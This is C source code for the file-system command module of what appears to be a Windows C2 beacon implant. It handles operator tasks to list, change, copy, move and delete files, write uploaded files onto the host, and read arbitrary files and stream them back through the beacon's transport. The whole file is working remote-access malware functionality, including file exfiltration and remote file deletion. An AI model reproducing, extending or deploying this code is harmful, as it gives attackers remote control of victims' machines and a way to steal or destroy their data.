// File-system commands: ls, cd, pwd, rm, cp, mv, upload, download.

#include "../core/beacon.h"

// ---- Utility helpers -------------------------------------------------------

// Convert narrow UTF-8 command argument to wide for WinAPI calls.
// Properly null-terminates после сконвертированной строки — иначе WinAPI
// будет читать мусор за её концом (CreateFileW, MoveFileExW и т.д.).
static void to_wide(const char* src, size_t src_len, wchar_t* dst, size_t dst_cap) {
    if (!dst_cap) return;
    int n = MultiByteToWideChar(CP_UTF8, 0,
                                src, (int)src_len,
                                dst, (int)(dst_cap - 1));
    if (n < 0) n = 0;
    if ((size_t)n >= dst_cap) n = (int)(dst_cap - 1);
    dst[n] = 0;
}

// Format FILETIME as "YYYY-MM-DD HH:MM" (16 chars + null).
static void fmt_filetime(const FILETIME* ft, char* out, size_t cap) {
    if (cap < 17) { if (cap) out[0]=0; return; }
    FILETIME lft;
    FileTimeToLocalFileTime(ft, &lft);
    SYSTEMTIME st;
    FileTimeToSystemTime(&lft, &st);
    out[ 0] = (char)('0' + st.wYear/1000);
    out[ 1] = (char)('0' + (st.wYear/100)%10);
    out[ 2] = (char)('0' + (st.wYear/10)%10);
    out[ 3] = (char)('0' + st.wYear%10);
    out[ 4] = '-';
    out[ 5] = (char)('0' + st.wMonth/10);
    out[ 6] = (char)('0' + st.wMonth%10);
    out[ 7] = '-';
    out[ 8] = (char)('0' + st.wDay/10);
    out[ 9] = (char)('0' + st.wDay%10);
    out[10] = ' ';
    out[11] = (char)('0' + st.wHour/10);
    out[12] = (char)('0' + st.wHour%10);
    out[13] = ':';
    out[14] = (char)('0' + st.wMinute/10);
    out[15] = (char)('0' + st.wMinute%10);
    out[16] = 0;
}

// u64 to decimal string; returns length.
static int u64_to_dec(uint64_t v, char* buf) {
    if (!v) { buf[0]='0'; buf[1]=0; return 1; }
    char tmp[21]; int n=0;
    while (v) { tmp[n++]=(char)('0'+v%10); v/=10; }
    int len=n;
    for (int i=0; i<n; ++i) buf[i]=tmp[n-1-i];
    buf[n]=0;
    return len;
}

// ---- ls --------------------------------------------------------------------

void cmd_ls(const BeaconTask* t) {
    wchar_t pattern[512];
    if (t->pay && t->pay_len > 0) {
        to_wide((const char*)t->pay, t->pay_len, pattern, 500);
        // Append \* if it looks like a directory (no wildcard).
        size_t wl = rt_wstrlen(pattern);
        if (wl && pattern[wl-1] != L'*' && pattern[wl-1] != L'?') {
            pattern[wl] = L'\\'; pattern[wl+1] = L'*'; pattern[wl+2] = 0;
        }
    } else {
        // Current directory
        GetCurrentDirectoryW(498, pattern);
        size_t wl = rt_wstrlen(pattern);
        pattern[wl] = L'\\'; pattern[wl+1] = L'*'; pattern[wl+2] = 0;
    }

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        const char err[] = "ls: path not found\n";
        out_write(err, sizeof(err)-1);
        return;
    }

    const char hdr[] = "Type  Size            Date             Name\n"
                       "----- --------------- ---------------- ----\n";
    out_write(hdr, sizeof(hdr)-1);

    do {
        char line[512]; char* p = line;
        BOOL dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        *p++ = dir ? 'd' : '-';
        *p++ = ' ';

        // Size (10 chars right-aligned).
        uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        char szstr[21]; int szlen = u64_to_dec(sz, szstr);
        for (int pad = szlen; pad < 15; ++pad) *p++ = ' ';
        rt_memcpy(p, szstr, szlen); p += szlen;
        *p++ = ' ';

        // Date
        char dt[17]; fmt_filetime(&fd.ftLastWriteTime, dt, sizeof(dt));
        rt_memcpy(p, dt, 16); p += 16;
        *p++ = ' ';

        // Name (wide → ANSI, enough for typical paths)
        char name_a[256];
        WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1,
                            name_a, sizeof(name_a), NULL, NULL);
        size_t nl = rt_strlen(name_a);
        rt_memcpy(p, name_a, nl); p += nl;
        *p++ = '\n';
        out_write(line, (size_t)(p - line));
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// ---- cd / pwd --------------------------------------------------------------

void cmd_cd(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return;
    wchar_t path[512];
    to_wide((const char*)t->pay, t->pay_len, path, 511);
    if (!SetCurrentDirectoryW(path)) {
        const char err[] = "cd: failed\n";
        out_write(err, sizeof(err)-1);
    }
}

void cmd_pwd(const BeaconTask* t) {
    (void)t;
    wchar_t buf[512];
    DWORD n = GetCurrentDirectoryW(512, buf);
    if (!n) return;
    char out[512];
    int len = WideCharToMultiByte(CP_UTF8, 0, buf, (int)n,
                                  out, sizeof(out)-1, NULL, NULL);
    if (len < 0) len = 0;
    out[len] = '\n';
    out_write(out, len+1);
}

// ---- rm / cp / mv ----------------------------------------------------------

void cmd_rm(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return;
    wchar_t path[512];
    to_wide((const char*)t->pay, t->pay_len, path, 511);
    if (!DeleteFileW(path)) {
        // Try removing as directory
        if (!RemoveDirectoryW(path)) {
            const char err[] = "rm: failed\n";
            out_write(err, sizeof(err)-1);
            return;
        }
    }
    const char ok[] = "removed\n";
    out_write(ok, sizeof(ok)-1);
}

void cmd_cp(const BeaconTask* t) {
    // Payload: "<src>\0<dst>"
    if (!t->pay || t->pay_len < 3) return;
    const char* src = (const char*)t->pay;
    size_t src_len = rt_strlen(src);
    if (src_len + 1 >= t->pay_len) return;
    const char* dst = src + src_len + 1;

    wchar_t wsrc[512], wdst[512];
    to_wide(src, src_len, wsrc, 511);
    size_t dst_len = t->pay_len - src_len - 1;
    to_wide(dst, dst_len, wdst, 511);

    if (!CopyFileW(wsrc, wdst, FALSE)) {
        const char err[] = "cp: failed\n";
        out_write(err, sizeof(err)-1);
        return;
    }
    const char ok[] = "copied\n";
    out_write(ok, sizeof(ok)-1);
}

void cmd_mv(const BeaconTask* t) {
    if (!t->pay || t->pay_len < 3) return;
    const char* src = (const char*)t->pay;
    size_t src_len = rt_strlen(src);
    if (src_len + 1 >= t->pay_len) return;
    const char* dst = src + src_len + 1;

    wchar_t wsrc[512], wdst[512];
    to_wide(src, src_len, wsrc, 511);
    size_t dst_len = t->pay_len - src_len - 1;
    to_wide(dst, dst_len, wdst, 511);

    if (!MoveFileExW(wsrc, wdst, MOVEFILE_REPLACE_EXISTING)) {
        const char err[] = "mv: failed\n";
        out_write(err, sizeof(err)-1);
        return;
    }
    const char ok[] = "moved\n";
    out_write(ok, sizeof(ok)-1);
}

// ---- upload ----------------------------------------------------------------

// Payload: [u32 path_len_le][path bytes][u64 offset_le][chunk bytes]
// offset == 0 → CREATE_ALWAYS (first chunk); offset > 0 → OPEN_EXISTING + seek.
void cmd_upload(const BeaconTask* t) {
    if (!t->pay || t->pay_len < 12) return;

    uint32_t path_len =
        (uint32_t)t->pay[0] | ((uint32_t)t->pay[1] << 8) |
        ((uint32_t)t->pay[2] << 16) | ((uint32_t)t->pay[3] << 24);

    if (4 + path_len + 8 > t->pay_len) return;

    const char* path = (const char*)(t->pay + 4);
    const uint8_t* op = t->pay + 4 + path_len;
    uint64_t offset =
        (uint64_t)op[0]        | ((uint64_t)op[1] <<  8) |
        ((uint64_t)op[2] << 16) | ((uint64_t)op[3] << 24) |
        ((uint64_t)op[4] << 32) | ((uint64_t)op[5] << 40) |
        ((uint64_t)op[6] << 48) | ((uint64_t)op[7] << 56);

    const uint8_t* data = op + 8;
    size_t data_len = t->pay_len - 4 - path_len - 8;

    wchar_t wpath[512];
    to_wide(path, path_len, wpath, 511);

    DWORD disp = (offset == 0) ? CREATE_ALWAYS : OPEN_EXISTING;
    HANDLE f = CreateFileW(wpath, GENERIC_WRITE, 0, NULL,
                           disp, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        const char err[] = "upload: open failed\n";
        out_write(err, sizeof(err)-1);
        return;
    }
    if (offset > 0) {
        LARGE_INTEGER li; li.QuadPart = (LONGLONG)offset;
        if (!SetFilePointerEx(f, li, NULL, FILE_BEGIN)) {
            CloseHandle(f);
            const char err[] = "upload: seek failed\n";
            out_write(err, sizeof(err)-1);
            return;
        }
    }
    DWORD wr = 0;
    if (data_len) WriteFile(f, data, (DWORD)data_len, &wr, NULL);
    CloseHandle(f);

    const char ok[] = "ok\n";
    out_write(ok, sizeof(ok)-1);
}

// ---- download --------------------------------------------------------------

void cmd_download(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return;
    wchar_t wpath[512];
    to_wide((const char*)t->pay, t->pay_len, wpath, 511);

    HANDLE f = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        const char err[] = "download: open failed\n";
        out_write(err, sizeof(err)-1);
        return;
    }

    const TransportVtbl* tr = get_transport();
    uint8_t buf[16 * 1024];
    DWORD rd = 0;
    while (ReadFile(f, buf, sizeof(buf), &rd, NULL) && rd > 0) {
        out_write(buf, rd);
        if (out_remaining() < sizeof(buf))
            out_flush_chunk(tr, 0);
    }
    CloseHandle(f);
    out_flush_chunk(tr, 1);
}
